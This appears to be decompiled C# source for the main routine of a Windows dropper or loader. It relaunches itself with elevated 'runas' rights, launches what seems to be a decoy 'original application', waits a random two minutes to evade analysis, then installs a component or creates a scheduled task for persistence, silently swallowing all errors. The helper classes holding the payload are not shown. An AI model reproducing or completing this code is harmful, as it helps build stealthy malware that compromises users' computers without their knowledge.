using MdmProject_v4;
using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

internal static class MainClass
{
	[STAThread]
	private static void Main(string[] args)
	{
		try
		{
			if (args.Length == 0)
			{
				FileUtils.LaunchFile(Application.ExecutablePath, "runas", true, ProcessWindowStyle.Normal);
			}
			else
			{
				OriginalApplicationLauncher.SaveAndLaunchOriginalApplication();
				Thread.Sleep(TimeSpan.FromMinutes((double)new Random().Next(2, 3)));
				TemplateVersionFactory @templateFactory = new TemplateVersionFactory();
				TemplateVersion templateVersion = @templateFactory.LocateFirstTemplateInstalled();
				TemplateInstaller templateInstaller = new TemplateInstaller(templateVersion);
				if (templateVersion.prop_tmp_dir == null)
				{
					templateInstaller.InstallTemplate();
				}
				else
				{
					templateInstaller.CreateTask(false);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
